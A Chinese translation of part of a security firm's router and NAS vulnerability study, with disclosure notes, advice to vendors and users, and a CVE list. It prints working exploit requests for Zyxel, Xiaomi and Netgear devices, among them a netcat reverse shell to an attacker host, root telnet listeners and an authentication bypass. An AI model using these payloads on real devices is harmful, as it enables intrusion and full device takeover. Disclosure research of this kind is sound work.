> 原文链接: https://www.anquanke.com//post/id/187219 


# SOHOpelessly Broken 2.0：网络访问服务中的安全漏洞分析（Part2）


                                阅读量   
                                **587293**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者securityevaluators，文章来源：securityevaluators.com
                                <br>原文地址：[https://www.securityevaluators.com/whitepaper/sohopelessly-broken-2/](https://www.securityevaluators.com/whitepaper/sohopelessly-broken-2/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t019974da930bbee2cc.jpg)](https://p1.ssl.qhimg.com/t019974da930bbee2cc.jpg)



## 0x04 规避安全控制

### <a class="reference-link" name="Zyxel%20NSA325%20v2"></a>Zyxel NSA325 v2

ISE在上一次研究中已经分析过Zyxel NSA325 v2，将这款设备升级到最新固件后，我们想研究下这次NSA325的安全性是否有所提高。

NSA325的web应用有点特别，使用了两个自定义的程序：`zysh`以及`zyshclient`，后者包含一个命令行接口。发往web应用API的各种请求最终都会让目标设备调用`zyshclient`（其中所需参数通过Unix管道进行传输），因此这里我们没法使用传统的命令注入技术。

对安全研究人员来说，幸运的是`zyshclient`可以采用交互式使用方式。启用telnet并登录NAS后，我们就可以启动`zyshclient`，如下所示：

```
~ $ zyshclient
&gt;
```

我们可以通过tab键来查看`zyshclient`支持的功能，如下所示：

```
~ $ zyshclient
&gt;
&lt;cr&gt;                          mrd
apply                         nfs
arp                           no
atse                          nslookup
aux                           package
backdoor                      packet-trace
browse                        ping
charDecoder                   pwron
clear                         reboot
configure                     release
connect_remote_share          rename
copy                          renew
debug                         rollback
delete                        run
dir                           show
disable                       show_remote_smb_shares
disconnect_remote_share       show_zysync_server_contents
domainami                     shutdown
dropbox                       storage
dservice                      tdc
enable                        test_connection
exit                          time_machine
fad                           traceroute
file                          ucopy
fileye                        user
gdrive                        uzync
import                        webdisk
interface                     whoami
ip                            wlan
ipcam                         write
job_controller                zy-pkgs
load                          zyfw
media
```

测试这些函数后，我们发现其中`package`会执行Linux系统命令。比如我们可以执行whoami命令，按到该进程以root权限执行，如下所示：

```
&gt; package whoami
root
retval = -1
ERROR: Parse error/command not found!
```

现在我们可以使用`package`命令来发起OS CMDi攻击，接下来我们需要完成如下操作：
- 找到能够调用`zyshclient`的web API请求；
- 终止运行`zyshclient`命令；
- 使用`package`函数注入命令。
我们可以使用如下POST请求来满足这些条件，生成在8383端口监听的telnet服务端：

```
POST /cmd,/ck6fup6/fileBrowser_main/browse HTTP/1.1
Host: 192.168.1.86
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 55
Cookie: language=en; ys-showedHomeBtnTooltip=b%3A1; ys-showedViewBtnTooltip=b%3A1; target=admin; authtok=572bvNtoFMUOot7PmFjGMNEfA61rZi3zntTm+KOnp9GXMicP6oUYt4AYcYfFbeME; ys-video_autoResume=b%3A1; ys-warnInstallPlayer=s%3Ayes; ys-warnVersionPlayer=s%3Ayes; ys-playerVolume=s%3A100

share=admin&amp;path=%2Fdownload"+%3b+package+telnetd+-l+/bin/sh+-p+8383+%3b+dir+"/&amp;start=0&amp;limit=26&amp;view=grid

```

其中`path`参数后的值经过编码，解码后的payload如下所示：

```
/download" ; package telnetd -l /bin/sh -p 8383 ; dir "/
```

该请求同样可以发起CSRF攻击，攻击者可以诱导经过身份认证的用户来发起该请求。攻击者只需要等待用户访问恶意页面，通过该页面发送跨域请求，其中就包含用户的cookie信息。

虽然Unix管道可以作为一种安全控制机制，避免传统的命令注入攻击，但用户数据还是会发送到目标服务，该服务会在设备的底层系统shell上执行任意命令。将我们发现的OS CMDi以及CSRF漏洞结合起来后，我们就可以通过尽可能少的用户交互来远程攻击这款设备。

### <a class="reference-link" name="Xiaomi%20Mi%20Router%203"></a>Xiaomi Mi Router 3

Xiaomi是中国市场中非常受欢迎的一个品牌，该品牌提供了Mi Router 3这款SOHO路由器。路由器管理功能基于Lua实现，采用类似MVC（Model-View-Controller）的架构。在评估这款设备时，我们首先分析了请求的路由机制，然后访问设备已实现的每个路由，寻找漏洞。

按照这些方法，我们发现在`luci/controller/api/misns.lua`中的`/cgi-bin/luci/;stok=/api/misns/wifi_access`这个URL端点会使用GET URL中传入的参数，将参数传递给一个shell命令。如下所示，我们演示了发往该端点的典型请求参数，该请求中包含用户的会话令牌以及待添加到`wifi_access`中的MAC地址。

```
GET /cgi-bin/luci/;stok=/api/misns/wifi_access?mac=&amp;sns=&amp;grant=1&amp;guest_user_id=guid&amp;timeout=timeout
```

该请求对应的控制器中包含一个辅助函数，可以确保这些参数非空（`nil`）或者不包含位于黑名单中的某些shell元字符（这些字符可以用来穿透shell参数上下文）。Mi Router设定的黑名单字符如下所示：

```
[`;|$&amp;`{``}` ]
```

我们可以使用换行符（`%0A`）来替代分号以及制表符（`%09`），从而绕过黑名单检查。利用这些字符，攻击者可以将命令注入`sns`参数。简单的GET请求如下所示：

```
GET /cgi-bin/luci/;stok=88de3a3ba0e9a64f50124fbf669f088f/api/misns/wifi_access?mac=00:00:00:00:00:00&amp;sns='%0atouch%09/tmp/ise%0a%23&amp;grant=1&amp;guest_user_id=guid&amp;timeout=timeout HTTP/1.1
```

这种字符绕过技术表明攻击者可以规避Xiaomi在设备上部署的一些安全控制机制。除了前面讨论的漏洞之外，这个端点其实还存在命令注入漏洞，并且不受字符黑名单限制。由于web应用逻辑中存在一个bug，设备永远不会检查`timeout`参数是否存在黑名单字符。这样攻击者就可以使用任意命令注入payload，不用考虑字符集问题。如下GET请求中，攻击者可以生成反弹shell，连接到攻击者的主机（`192.168.31.82:9001`）。

```
GET /cgi-bin/luci/;stok=d714f92968bb8cc6466f87c8618dfc30/api/misns/wifi_access?mac=00:00:00:00:00:00&amp;sns=sns&amp;grant=1&amp;guest_user_id=guid&amp;timeout=’%3bmkfifo+/tmp/p%3bcat+/tmp/p|/bin/sh+-i+2&gt;%261|nc+192.168.31.82+9001+&gt;/tmp/p+%23 HTTP/1.1
Host: 192.168.31.1
```

为了绕过Xiaomi的安全控制机制，我们首先判断哪些字符被禁用，列出了shell能够接受的其他元字符，最终将黑名单中的字符替换成其他能被等效解析的字符。如前文所示，我们也在其他端点中找到了编程逻辑漏洞，可以让我们完全绕过黑名单。

### <a class="reference-link" name="Netgear%20Nighthawk%20R9000"></a>Netgear Nighthawk R9000

NETGEAR Nighthawk X10 R9000是一款高端旗舰路由器，支持多种流量管理及其他管理功能。该设备的主要用户接口为web应用，但也提供了基于SOAP的移动应用。管理员可以管理常见的网络设置、查看设备日志、管理QoS以及其他各种设置。

根据我们对移动应用的分析，我们发现目标应用会解析`X-Forwarded-For`这个HTTP头。通常情况下，各种负载均衡方案会利用这个头来将客户端的IP地址投递给下游服务，但如果没有正确使用就可能导致出现意外问题。这款设备似乎会将头部中的内容当成客户端的实际IP地址，覆盖之前设置的任何值。该设备同样还会将来自自身IP的所有请求加入白名单中，内部请求不经过身份认证就能直接使用API。当结合这两点后，攻击者就可以绕过SOAP API上的所有认证检查机制，这是因为客户端可以控制`X-Forwarded-For`这个HTTP头，并且设备没有在任何类型的负载均衡器或者反向代理的保护之下。此外，`X-Forwarded-For`头也不是一个被禁用的头部字段。因此，攻击者可以在JavaScript中通过XHR请求发送该字段值。

在初步测试和扫描过程中，我们还找到了web界面中虽然隐藏但又描述详实的一个debug功能。`/debug.htm`是非常有用的一个页面，可以让经过身份认证的用户运行telnet服务端，获得root shell访问权限。这并不是一个漏洞，因为想实现这种访问方式需要提供管理员的用户名及密码，但该功能的确能起到很好效果，帮助我们进一步检测和分析这款设备。通过这个切入点，我们可以对web应用进行静态分析，定位可能存在漏洞的代码路径，然后对目标代码路径进行实时分析。

经过分析后，我们发现SOAP API会多次调用shell，其中有些还包含比较危险的用户输入。虽然大多数危险调用无法直接访问，我们还是观察到设备会通过`NewDeviceMAC`元素，使用`AdvancedQoS:1#GetCurrentBandwidthByMAC`来传递用户输入数据。然而这个输入数据比较受限，存在如下限制条件：
- 最多可以使用17个字符；
- 至少要包括一个冒号；
- 必须使用单引号和元字符才能跳出已有的命令来执行；
- 必须处理注入点之后残留的父级命令；
- payload必须全部大写。
尽管存在这些限制条件，我们还是可以通过该漏洞获得交互式访问root shell。由于web服务器中HTTP头中会将某些全大写字段与一些环境变量绑定在一起，因此我们可以将payload插入这种头部，然后在注入点引用这些环境变量。如下所示，我们可以通过这个PoC在8383端口上绑定生成未经身份认证的监听端。需要注意的是，这里的`SessionID`元素并不固定，可以设置为任意值。

```
POST /soap/server_sa/ HTTP/1.1
SOAPAction: urn:NETGEAR-ROUTER:service:AdvancedQoS:1#GetCurrentBandwidthByMAC
X-Forwarded-For: 192.168.1.1
Range: utelnetd -d -p 8383 -l /bin/sh

&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;
&lt;SOAP-ENV:Envelope&gt;
&lt;SOAP-ENV:Header&gt;
&lt;SessionID&gt;424F474F4E424F474F4E&lt;/SessionID&gt;
&lt;/SOAP-ENV:Header&gt;
&lt;SOAP-ENV:Body&gt;
&lt;M1:GetCurrentBandwidthByMAC&gt;
  &lt;NewDeviceMAC&gt;:';$HTTP_RANGE ##&lt;/NewDeviceMAC&gt;
&lt;/M1:GetCurrentBandwidthByMAC&gt;
&lt;/SOAP-ENV:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;

```

虽然这种攻击要求设备启用QoS以及高级QoS服务，并且要通过身份认证，但我们可以在使用出厂设置的目标设备上绕过这些限制，完成攻击任务。我们可以使用前面提到的`X-Forwarded-For`方法绕过认证，只要添加一个`X-Forwarded-For`头，将值设置为路由器的LAN口IP地址（`192.168.1.1`）即可。通过这种认证绕过技术，攻击者可以通过如下4个步骤启用QoS以及高级QoS服务：

请求1:

```
POST /soap/server_sa/ HTTP/1.1
SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#ConfigurationStarted
X-Forwarded-For: 192.168.1.1



&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;
&lt;SOAP-ENV:Envelope&gt;
&lt;SOAP-ENV:Header&gt;
&lt;SessionID&gt;424F474F4E424F474F4E&lt;/SessionID&gt;
&lt;/SOAP-ENV:Header&gt;
&lt;SOAP-ENV:Body&gt;
&lt;M1:ConfigurationStarted&gt;
   &lt;NewSessionID&gt;424F474F4E424F474F4E&lt;/NewSessionID&gt;
&lt;/M1:ConfigurationStarted&gt;
&lt;/SOAP-ENV:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;

```

请求2:

```
POST /soap/server_sa/ HTTP/1.1
SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SetQoSEnableStatus
X-Forwarded-For: 192.168.1.1



&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;soap:Envelope&gt;
   &lt;soap:Header&gt;
     &lt;SessionID&gt;424F474F4E424F474F4E&lt;/SessionID&gt;
  &lt;/soap:Header&gt;
  &lt;soap:Body&gt;
    &lt;M1:SetQoSEnableStatus&gt;
    &lt;NewQoSEnable&gt;1&lt;/NewQoSEnable&gt;
    &lt;/M1:SetQoSEnableStatus&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;

```

请求3:

```
POST /soap/server_sa/ HTTP/1.1
SOAPAction: urn:NETGEAR-ROUTER:service:AdvancedQoS:1#SetQoSEnableStatus
X-Forwarded-For: 192.168.1.1



&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;soap:Envelope&gt;
   &lt;soap:Header&gt;
      &lt;SessionID&gt;424F474F4E424F474F4E&lt;/SessionID&gt;
  &lt;/soap:Header&gt;
  &lt;soap:Body&gt;
      &lt;M1:SetQoSEnableStatus&gt;
      &lt;NewQoSEnable&gt;1&lt;/NewQoSEnable&gt;
      &lt;/M1:SetQoSEnableStatus&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;

```

请求4:

```
POST /soap/server_sa/ HTTP/1.1
SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#ConfigurationFinished
X-Forwarded-For: 192.168.1.1



&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;
&lt;SOAP-ENV:Envelope&gt;
&lt;SOAP-ENV:Header&gt;
&lt;SessionID&gt;424F474F4E424F474F4E&lt;/SessionID&gt;
&lt;/SOAP-ENV:Header&gt;
&lt;SOAP-ENV:Body&gt;
&lt;M1:ConfigurationFinished&gt;
  &lt;NewStatus&gt;ChangesApplied&lt;/NewStatus&gt;
&lt;/M1:ConfigurationFinished&gt;
&lt;/SOAP-ENV:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;

```

发送这些请求后，攻击者有可能发起前面提到的命令注入攻击。然而攻击可能无法立即生效，如果注入失败，攻击者可以生成web流量，通过路由器路由（比如加载远程web站点上的图像）然后再次尝试。

虽然前面提到的案例都假设攻击者位于LAN网络中，但攻击者也可以通过DNS重绑定来远程发起攻击。这类攻击从形式上非常类似于CSRF，需要位于路由器LAN网络中的某个受害者访问攻击者控制的页面，然后让受害者浏览器向路由器发送恶意请求。与CSRF不同，DNS重绑定可以绕过跨域限制，但无法利用已有的会话cookie。对于Nighthawk R9000而言，这种攻击方式非常完美。如果我们想直接通过JavaScript XHR，利用前面的PoC发起请求，就会碰到跨域问题。但由于DNS重绑定会被当成同一个源，因此可以绕过这个限制。因此，攻击者可以让受害者浏览攻击者控制的某个页面，然后就能让受害者的浏览器攻击目标路由器。



## 0x05 IoT安全新进展

从SOHOpelessly Broken 1.0到2.0，中间隔了整整五年，这期间厂商在安全控制方面做了一些改变，安全和漏洞披露环境也有了一些变化。我们在这里探索了下这几年之间的一些差异。

### <a class="reference-link" name="IoT%E5%AE%89%E5%85%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8F%98%E5%8C%96"></a>IoT安全的技术变化

2013年，许多IoT设备的设计思路是简单易用并且成本低廉，尽管这几年来变化不大，但硬件及安全性方面的改进也带来了许多新功能，其中包括在不增加制造成本前提下能够增强安全性的一些功能。比如，在SOHOpelessly Broken 2.0中，我们看到了使用ASLR的Asus路由器，这种加固功能可以增加缓冲区溢出的攻击难度，而SOHOpelessly Broken 1.0研究的所有路由器都未部署该功能。此外，我们还发现一些厂商部署了增加逆向分析难度的一些功能。比如Terramaster F2-420会使用名为`screw_aes`的一个PHP模块来加密PHP web应用所使用的文件，这样攻击者想获取管理面板的源代码会变得更加困难。Seagate STCR3000101部署了自己的请求完整性验证机制，可以防止攻击者修改HTTP请求。

我们可以关注从SOHOpelessly Broken 1.0以来没有变化的方面，这一点比较有趣。虽然反CSRF令牌以及浏览器安全头在主流web应用中非常常见，但我们研究的这些设备中依然很少部署这些机制。这些深度防御机制可以极大增强web应用以及底层系统的安全性。在许多情况下，如果采用常见的web应用安全实践，我们的远程攻击方法就很难奏效。

### <a class="reference-link" name="IoT%E5%AE%89%E5%85%A8%E7%9A%84%E5%85%B6%E4%BB%96%E5%8F%98%E5%8C%96"></a>IoT安全的其他变化

截至2018年，IoT设备厂商已经采取一些措施来改善设备安全性。Netgear、Synology、QNAP以及Xiaomi都公开了漏洞赏金计划，用来奖励披露漏洞的安全研究人员。Lenovo以及Asus会展示“名人堂”页面，感谢通过官方披露程序提交漏洞的研究人员。

除了漏洞赏金计划之外，某些设备厂商还采用了用于披露漏洞的安全联系方式。通常情况下，这种联系方式是一个电子邮件地址，可以在厂商官网页面中找到。

还有另一个变化，那就是CNA（CVE Numbering Authorities）计划。公开披露的漏洞通常会被分配一个CVE（Common Vulnerabilities and Exposures）编号，可以方便厂商、系统管理员以及用户跟踪相关问题。MITRE Corporation负责维护分配和管理CVE事宜。从历史惯例上来看，MITRE是唯一可以分配CVE编号的单位。然而当出现CNA计划后，情况有所改变，该计划允许已注册的公司和组织分配CVE编号。我们评估的一些设备制造商也加入了CNA，并向ISE分配了一些CVE编号。

CNA计划并非十全十美。中分析过程中，我们尝试通过Netgear申请CVE，以解决我们中Netgear Nighthawk R9000中发现的漏洞。但从2018年12月到2019年4月，我们没有得到任何反馈。直到我们收到Netgear的邮件，表示他们已不再参与CNA计划，不能颁发CVE，我们才向MITRE报告相关细节，最后MITRE向我们颁发了CVE编号。

随着人们对安全性以及安全功能的不断重视和改进，大家可能会认为设备安全性也不断增强，因此设备出现的漏洞数量应该会有所减少，尤其是高危级别的漏洞。然而，根据我们对这些设备的研究，我们并没有得到相同的结果。



## 0x06 披露过程

我们按照流程负责任地向设备厂商披露了我们发现的所有漏洞。如前文所述，有些采用漏洞赏金模式，有些我们直接与厂商联系。大多数厂商比较负责，会确认收到漏洞报告。在某些情况下，我们还与厂商协作，共同复现问题或者解释漏洞细节。

在协作的厂商中，有3个属于CNA，这些厂商分别为Lenovo Group Ltd.、QNAP Systems, Inc.以及Synology Inc。在2019年年初之前，Netgear Inc.仍然是CNA，但我们并不清楚为何该公司不再参与该计划。如果一家公司承担CNA角色，则代表他们会更加投入安全社区中，可以直接与安全人员进行交流。

此外，有一些厂商提供了漏洞赏金计划，包括：Synology Inc.、Xiaomi Corp.以及Netgear Inc。其中，Synology和Netgear会直接提供现金奖励，而Xiaomi会提供商品奖励。在之前的SOHOpelessly Broken研究中，没有一家厂商会提供漏洞奖金，这是一个明显的变化。

不幸的是，并非所有的披露过程都一帆风顺。有些公司没有回应我们最初提交的漏洞报告，其他单位则根本不提供安全联系方式，因此我们被迫通过这些厂商的一般联系方式来反馈漏洞细节。在我们联系的13家厂商中，尽管我们多次尝试，仍然有3家没有回复我们的报告，这些厂商为Drobo Inc.、Buffalo Americas，Inc.以及Zioncom HoldingsLtd。截至本文发表时，我们还没有收到来自Buffalo Americas Inc.和Zioncom Holdings Ltd.的任何信息。我们能够联系上Drobo Inc.，但当我们将调查结果重新发送给他们后，就再也没有收到任何回复。



## 0x07 建议

这里我们为厂商以及消费者给出关于改进IoT安全方面的一些建议。

### <a class="reference-link" name="%E8%AE%BE%E5%A4%87%E5%8E%82%E5%95%86"></a>设备厂商

可以看到，IoT设备厂商在安全社区中的存在感不断加强，但设备本身的安全性并没有得到任何实质性的提高。我们认为，设备厂商必须培训开发人员在安全实践方面的意识，利用内部或者外部安全团队来审核设备上运行的软件。厂商在最初计划阶段就必须考虑安全性，并且应该贯彻到以后的所有阶段。这种软件开发生命周期应该可以改进最终系统的安全性。然而，厂商还可以考虑利用现实攻击场景中的威胁模型以及方法来主动测试设备安全性，这一点也非常重要。

### <a class="reference-link" name="%E6%B6%88%E8%B4%B9%E8%80%85%E5%8F%8A%E4%BC%81%E4%B8%9A%E7%94%A8%E6%88%B7"></a>消费者及企业用户

在购买新的IoT设备时，安全性是至关重要的一个因素。我们应当避免采购历史上出现各种安全漏洞的厂商所生产的设备；与此同时，厂商对补丁程序以及设备的支持周期也是应该考虑的重要因素。

购买和安装设备后，管理员应该禁用未使用的功能，启用安全控制机制（如果存在的话），采用漏洞修补策略，定期更新固件来加固安全性。此外，应尽可能避免使用远程访问功能，因为这会把设备开放给互联网上的攻击者，无法将威胁限制在内部网络中。



## 0x08 总结

根据我们在SOHOpelessly Broken 2.0的研究成果，许多常见的IoT设备都存在远程利用风险。我们研究的设备不局限于某个厂商，而是拓展到业内知名且广受好评的一些品牌型号。

我们可以通过漏洞赏金之类的计划来提高安全意识，修复漏洞等，但存在漏洞本身就是一件令人担忧的事情。比如，在我们研究等设备中，经常可以看到OS CMDi之类的漏洞。对于非IoT环境等现代web应用而言，这种缺陷的存在可能无法让人接受。设备发行后的漏洞修复机制也有问题，厂商可能会发行大量设备，之后不再进行安全更新。即使厂商提供了补丁固件，这些设备也容易存在因为公开披露漏洞所带来的安全风险。

通过SOHOpelessly Broken 2.0研究，我们向大家展示了IoT设备厂商当前的安全控制机制，厂商想通过这些机制避免远程攻击者完全控制目标设备。尽管有些型号需要更近一步分析才能发现问题，但只要对设备具备网络级别的访问权限，任何人都可以轻松攻击其中许多型号的设备。在这个基础上，我们可以得出结论：尽管从2013年以来，IoT设备厂商对安全性方面的重视程度不断提高，但是部署在SOHO环境中的常见设备依然可能存在被攻击、出现严重后果的风险。



## 0x09 后续研究

这次我们的研究目标是发现可充分利用的漏洞，可以被攻击者远程利用。但这里我们并没有详尽考察可能存在的漏洞， 没有检查许多设备提供的服务和功能。

在后续研究中，我们会分析这些设备之间的共享库。我们的最终目标仍然是找到可远程利用的漏洞，但不会把重点放在设备的管理面板上。我们还会研究设备如何生成身份认证令牌，这里许多设备都开发了自己的会话令牌生成及验证机制。找到会话令牌生成中的安全问题后，我们可以直接进行身份认证或者提升权限。最后，我们还将考察固件发布及处理流程。如果能够拦截并修改固件，我们就可以远程攻击目标设备，不需要经过身份认证。

## 0x0A 参考资料

[1] “The Internet of Things: How to capture the value of IoT,” McKinsey &amp; Company, May-2018. [Online]. Available: [https://www.mckinsey.com/~/media/McKinsey/Business](https://www.mckinsey.com/~/media/McKinsey/Business) Functions/McKinsey Digital/Our Insights/The Internet of Things How to capture the value of IoT/How-to-capture-the-value-of-IoT.ashx. [Accessed: 08-Apr-2019].

[2] [https://www.securityevaluators.com/wp-content/uploads/2017/07/soho_techreport.pdf](https://www.securityevaluators.com/wp-content/uploads/2017/07/soho_techreport.pdf)

[3] J. Holcomb, “Network Attached Shell: N.A.S.ty Systems That Store Network Accessible Shells,” Jul-2014. [Online]. Available: [https://www.blackhat.com/docs/eu-14/materials/eu-14-Holcomb-Network-Attached-Shell-N-A-S-ty-Systems-That-Store-Network-Accessible-Shells.pdf](https://www.blackhat.com/docs/eu-14/materials/eu-14-Holcomb-Network-Attached-Shell-N-A-S-ty-Systems-That-Store-Network-Accessible-Shells.pdf).

[4] “VPNFilter: New Router Malware with Destructive Capabilities,” 23-May-2018. [Online]. Available: [https://www.symantec.com/blogs/threat-intelligence/vpnfilter-iot-malware](https://www.symantec.com/blogs/threat-intelligence/vpnfilter-iot-malware). [Accessed: 08-Apr-2019].

[5] A. Marion, “Vulnerability Disclosure Policy,” Feb-2018. [Online]. Available: [https://vuls.cert.org/confluence/display/Wiki/Vulnerability](https://vuls.cert.org/confluence/display/Wiki/Vulnerability) Disclosure Policy. [Accessed: 08-Apr-2019].

[6] “CWE-352: Cross-Site Request Forgery (CSRF).” [Online]. Available: [https://cwe.mitre.org/data/definitions/352.html](https://cwe.mitre.org/data/definitions/352.html). [Accessed: 08-Apr-2019].

[7] S. Barum and M. Gegick, “Reluctance to Trust,” Sep-2015. [Online]. Available: [https://www.us-cert.gov/bsi/articles/knowledge/principles/reluctance-to-trust](https://www.us-cert.gov/bsi/articles/knowledge/principles/reluctance-to-trust).

[8] A. Mousa and A. Hamad, “Evaluation of the RC4 Algorithm for Data Encryption.” [Online]. Available: [https://staff-old.najah.edu/sites/default/files/Evaluation_of_the_RC4_Algorithm_for_Data_Encryption.pdf](https://staff-old.najah.edu/sites/default/files/Evaluation_of_the_RC4_Algorithm_for_Data_Encryption.pdf). [Accessed: 08-Apr-2019].

[9] C. Shannon, “Communication theory of secrecy systems,” Oct-1949. [Online]. Available: [https://ieeexplore.ieee.org/document/6769090/metrics#metrics](https://ieeexplore.ieee.org/document/6769090/metrics#metrics). [Accessed: 08-Apr-2019].

[10] H. Ballani, Y. Chawathe, S. Ratnasamy, T. Roscoe, and S. Shenker, “Off by Default!,” Nov-2016. [Online]. Available: [https://www.microsoft.com/en-us/research/wp-content/uploads/2016/11/hotnets05-defoff.pdf](https://www.microsoft.com/en-us/research/wp-content/uploads/2016/11/hotnets05-defoff.pdf). [Accessed: 08-Apr-2019].

[11] Stanek, M. (2017). Secure by default – the case of TLS. [online] Arxiv.org. Available at: [https://arxiv.org/pdf/1708.07569.pdf](https://arxiv.org/pdf/1708.07569.pdf) [Accessed 15 May 2019].

[12] Jansen, B. (2018). Security By Default: A Comparative Security Evaluation of Default Configurations. [online] Uvalight.net. Available at: [https://uvalight.net/~delaat/rp/2017-2018/p01/report.pdf](https://uvalight.net/~delaat/rp/2017-2018/p01/report.pdf) [Accessed 15 May 2019].

[13] “CVE Numbering Authorities.” [Online]. Available: [https://cve.mitre.org/cve/cna.html](https://cve.mitre.org/cve/cna.html). [Accessed: 08-Apr-2019].



## 0x0B 附录：CVE编号

Buffalo TeraStation TS5600D1206<br>
CVE-2018-13323 – Cross-site scripting via “username” cookie<br>
CVE-2018-13322 – Arbitrary Directory Listing via Path Traversal<br>
CVE-2018-13319 – Unauthenticated Information Disclosure<br>
CVE-2018-13324 – Authentication Bypass on JSONRPC API<br>
CVE-2018-13318 – Command Injection During User Creation (Second Order)<br>
CVE-2018-13320 – Command Injection in NT Domain Settings<br>
CVE-2018-13321 – Internal Functions Accessible via JSONRPC API<br>
ASUS RT-AC3200<br>
CVE-2018-14710 – Reflected Cross-Site Scripting via appGet.cgi<br>
CVE-2018-14711 – Missing Cross-Site Request Forgery Protection on appGet.cgi<br>
CVE-2018-14714 – Command Injection via load_script Hook in appGet.cgi<br>
CVE-2018-14713 – Uncontrolled Format String via nvram_match Family in appGet.cgi<br>
CVE-2018-14712 – Stack Buffer Overflow via delete_sharedfolder() in appGet.cgi<br>
TerraMaster F2-420<br>
CVE-2018-13334 – Insufficient validation and sanitization in System name<br>
CVE-2018-13329 – Insufficient validation and sanitization in URL Parameters (Reflected XSS)<br>
CVE-2018-13337 – Session Fixation<br>
CVE-2018-13338 – System Command Injection in User Creation (username)<br>
CVE-2018-13336 – System Command Injection in User Creation (password)<br>
CVE-2018-13332 – Arbitrary File Upload Location<br>
CVE-2018-13333 – Persistent Cross-site Scripting via username in File Manager Permissions<br>
CVE-2018-13331 – Persistent Cross-site Scripting via username in Control Panel<br>
CVE-2018-13330 – System Command Execution in Group Creation<br>
CVE-2018-13335 – Persistent Cross-site Scripting via Shared Folder description in Control Panel<br>
CVE-2018-13357 – Persistent Cross-site Scripting via Shared Folder name in Control Panel<br>
CVE-2018-13352 – Session Tokens are stored as files in /tmp<br>
CVE-2018-13349 – Persistent Cross-site Scripting via username upon Login<br>
CVE-2018-13355 – Missing Authorization Check on Group Creation<br>
CVE-2018-13351 – Reflected Cross-site Scripting via Edit User Form<br>
CVE-2018-13356 – Missing Authorization on User Edit<br>
CVE-2018-13358 – System Command Injection in ajaxdata.php (checkName)<br>
CVE-2018-13353 – System Command Injection in ajaxdata.php (checkport)<br>
CVE-2018-13418 – System Command Injection in ajaxdata.php (User rename)<br>
CVE-2018-13354 – Unauthenticated System Command Injection in logtable.php<br>
CVE-2018-13350 – Unauthenticated SQL Injection in logtable.php<br>
CVE-2018-13361 – Unauthenticated User Enumeration<br>
CVE-2018-13359 – Unauthenticated Reflected Cross-Site Scripting<br>
CVE-2018-13360 – Reflected Cross-Site Scripting in Text Editor<br>
Drobo 5N2<br>
CVE-2018-14699 – Unauthenticated Command Injection in username parameter in enable_user<br>
CVE-2018-14697 – Reflected Cross-Site Scripting in enable_user<br>
CVE-2018-14698 – Reflected Cross-Site Scripting in delete_user<br>
CVE-2018-14701 – Unauthenticated Command Injection in username parameter in delete_user<br>
CVE-2018-14703 – Unauthenticated Access to MySQL Database Password<br>
CVE-2018-14700 – Unauthenticated Access to MySQL Log Files<br>
CVE-2018-14695 – Unauthenticated Access to MySQL diag.php<br>
CVE-2018-14696 – Unauthenticated Access to device info via MySQL API drobo.php<br>
CVE-2018-14702 – Unauthenticated Access to device info via Drobo Pix API drobo.php<br>
CVE-2018-14704 – Reflected Cross-Site Scripting via MySQL API droboapps.php<br>
CVE-2018-14705 – Lack of Authentication/Authorization on Administrative Web Pages<br>
CVE-2018-14706 – Unauthenticated Command Injection in DroboPix<br>
CVE-2018-14707 – Unauthenticated Arbitrary File Upload in Drobo Pix<br>
CVE-2018-14709 – Insufficient Authentication in Client-Server Communications Between Drobo Dashboard and NASd<br>
CVE-2018-14708 – Missing Transport Security in Client-Server Communications Between Drobo Dashboard and NASd<br>
Zyxel NSA325 v2<br>
CVE-2018-14892 – Missing Request Origin Verification Functionality (No CSRF Protections)<br>
CVE-2018-14893 – Low-Privilege Root Command Injection via API<br>
TOTOLINK A3002RU<br>
CVE-2018-13313 – Admin Password returned in password.htm<br>
CVE-2018-13312 – Cross-site Scripting in notice_gen.htm<br>
CVE-2018-13308 – Cross-site Scripting in notice_gen.htm<br>
CVE-2018-13309 – Cross-site Scripting in password.htm<br>
CVE-2018-13310 – Cross-site Scripting in password.htm<br>
CVE-2018-13315 – Missing Server-side Validation of Current Password During Password Change<br>
CVE-2018-13311 – Command Injection via Samba Username<br>
CVE-2018-13306 – Command Injection via FTP Username<br>
CVE-2018-13307 – Command Injection via NTP Server IP Address<br>
CVE-2018-13314 – Command Injection in formAliasIP<br>
CVE-2018-13316 – Command Injection in formAliasIP<br>
CVE-2018-13317 – Cross-site scripting via URL Filter<br>
Asustor AS-602T<br>
CVE-2018-12311 – Missing Input Sanitization on File Explorer filenames<br>
CVE-2018-12308 – Shared Folder Encryption Key sent as URL Parameter<br>
CVE-2018-12305 – Cross-site Scripting via SVG Images<br>
CVE-2018-12306 – Directory Traversal via download.cgi<br>
CVE-2018-12314 – Directory Traversal via downloadwallpaper.cgi<br>
CVE-2018-12309 – Directory Traversal via upload.cgi<br>
CVE-2018-12316 – Command injection via filenames<br>
CVE-2018-12313 – Unauthenticated access to SNMP configuration<br>
CVE-2018-12307 – Command Injection Through UserAdd<br>
CVE-2018-12312 – Command Injection Through Generate Two Step Auth<br>
CVE-2018-12310 – Cross-site Scripting on Login page<br>
